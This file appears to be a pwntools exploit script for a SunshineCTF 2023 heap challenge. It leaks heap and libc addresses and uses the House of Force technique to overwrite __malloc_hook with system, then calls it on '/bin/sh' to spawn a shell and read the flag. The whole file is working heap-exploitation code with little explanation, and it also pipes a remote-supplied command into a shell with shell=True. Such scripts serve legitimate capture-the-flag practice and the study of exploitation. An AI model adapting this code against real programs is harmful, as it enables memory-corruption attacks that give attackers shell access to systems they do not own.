#!/usr/bin/env python3
from pwn import *
import subprocess

elf = ELF("./house_patched")
ld = ELF("./ld-linux-x86-64.so.2")
libc = ELF("libc.so.6")

context.binary = elf
NULL = 0x0

'''
    #######################################
    #  REST AT THE END NOT IN THE MIDDLE  #
    #######################################
'''


def conn():
    global p, ssh_conn
    ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
    if args.FLAG:
        running = log.progress("Createing the flag...")
        try:
            os.system("echo 'PWN{a_placeholder_32byte_flag}' > flag.txt")
            running.success()
        except:
            running.failure()
    if args.REMOTE:
        p = remote("chal.2023.sunshinectf.games", 23001)
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        p = sshc.process([ssh_conn[4]])
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p,'''
                b call_emergency_meeting
                ''')
        if args.PATCH:
            elf.asm(elf.symbols['alarm'], 'ret')
            elf.save([elf.path])
    return p

def get_one_gadget(filename: str, base_address=NULL) -> int:
    return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]

def solve_poc(p):
    p.recvuntil(b"work: ")
    cmd = p.recvline()
    proc = log.progress(f"solving POC")

    try:
        solve = subprocess.check_output(cmd, shell=True, text=True).strip()
        proc.success("Done")
    except:
        proc.failure("Error")
        exit(-1)

    log.info(f"solve @ {solve}")
    p.sendline(solve.encode('utf-8'))

def call_emergency(size: int, payload: bytes, choice: int):
    p.sendlineafter(b"choice: ", b"3", timeout=0.5)
    p.sendlineafter(b"be? ", str(size).encode(), timeout=0.5)
    p.sendlineafter(b"response: ", payload, timeout=0.5)
    p.sendlineafter(b"choice: ", str(choice).encode(), timeout=0.5)

def get_leak():
    p.recvuntil(b"game: ", timeout=0.5)
    leak = int(p.recvline().strip(), 16) + 0x1050

    return leak

def rand_leak():
    p.sendlineafter(b"choice: ", b"2", timeout=0.5)
    p.recvuntil(b"seed: ", timeout=0.5)
    leak = int(p.recvline().strip(), 10)
    p.sendlineafter(b"choice: ", b"3", timeout=0.5)
    
    return leak

def house_of_force(heap_leak: int):
    __malloc_hook = libc.symbols['__malloc_hook']
    result_address = __malloc_hook - heap_leak - 0x20
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    log.info(f"/bin/sh @ {hex(bin_sh)}")

    call_emergency(result_address, b"zzzzz", 3)
    call_emergency(10, p64(libc.symbols['system']), 3)
    call_emergency(bin_sh, b"cat flag.txt", 3)

def main():
    with conn() as p:
        heap_chunk = get_leak()
        log.info(f"heap_leak @ {hex(heap_chunk)}")

        call_emergency(0xa, b"aaaa", 3)

        payload = flat(
            b"A" * 0x10,
            p64(NULL),
            p64(0xffffffffffffffff),
        )
        call_emergency(0xa, payload, 3)
        
        rand = rand_leak()
        log.info(f"rand @ {hex(rand)}")
        
        libc.address = rand - libc.symbols['rand']
        log.info(f"libc_base @ {hex(libc.address)}")

        house_of_force(heap_chunk)

        p.interactive()


if __name__ == "__main__":
    main()
